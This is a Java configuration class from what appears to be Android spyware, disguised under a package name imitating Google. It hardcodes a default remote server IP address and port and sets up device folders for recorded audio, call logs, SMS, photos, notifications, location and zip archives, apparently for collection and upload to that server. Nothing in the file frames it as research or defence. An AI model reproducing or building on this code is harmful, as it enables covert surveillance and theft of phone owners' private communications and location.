package com.google.android.android;

import android.content.SharedPreferences;
import android.os.Build;

import java.io.File;

/**
 * Created by user-pc on 01.06.2017.
 */

public class Config {
    private static SharedPreferences _preferences;

    public static String IP_ADDRESS;
    public static int SERVER_PORT;

    public static String PHONE_NAME;
    public static String RECORD_PATH;
    public static String CALLS_PATH;
    public static String SMS_PATH;
    public static String PHOTOS_PATH;
    public static String ZIP_PATH;
    public static String NOTIFICATION_PATH;
    public static String LOCATION_PATH;

    public static void load(SharedPreferences preferences) {
        _preferences = preferences;
        IP_ADDRESS = preferences.getString("IP_ADDRESS", "89.223.26.160");
        SERVER_PORT = preferences.getInt("SERVER_PORT", 1121);
        PHONE_NAME = preferences.getString("PHONE_NAME", Build.MODEL);
        RECORD_PATH = preferences.getString("RECORD_PATH", "sdcard/Android/records/");
        CALLS_PATH = preferences.getString("CALLS_PATH", "sdcard/Android/calls/");
        SMS_PATH = preferences.getString("SMS_PATH", "sdcard/Android/sms/");
        PHOTOS_PATH = preferences.getString("PHOTOS_PATH", "sdcard/Android/photos/");
        ZIP_PATH = preferences.getString("ZIP_PATH", "sdcard/Android/zip/");
        NOTIFICATION_PATH = preferences.getString("NOTIFICATION_PATH", "sdcard/Android/notification/");
        LOCATION_PATH = preferences.getString("LOCATION_PATH", "sdcard/Android/location/");

        checkDirectories();
    }

    private static void checkDirectories() {
        String[] dirs = {RECORD_PATH,CALLS_PATH,SMS_PATH,PHOTOS_PATH,ZIP_PATH,NOTIFICATION_PATH,LOCATION_PATH};
        for (String dir : dirs) {
            File file = new File(dir);
            if (!file.exists()) file.mkdir();
        }
    }

    public static boolean setName(String name) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putString("PHONE_NAME", name);
        if (editor.commit()) {
            PHONE_NAME = name;
            return true;
        }
        return false;
    }

    public static boolean setIpAddress(String ipAddress) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putString("IP_ADDRESS", ipAddress);
        if (editor.commit()) {
            IP_ADDRESS = ipAddress;
            return true;
        }
        return false;
    }

    public static boolean setServerPort(int serverPort) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putInt("SERVER_PORT", serverPort);
        if (editor.commit()) {
            SERVER_PORT = serverPort;
            return true;
        }
        return false;
    }
}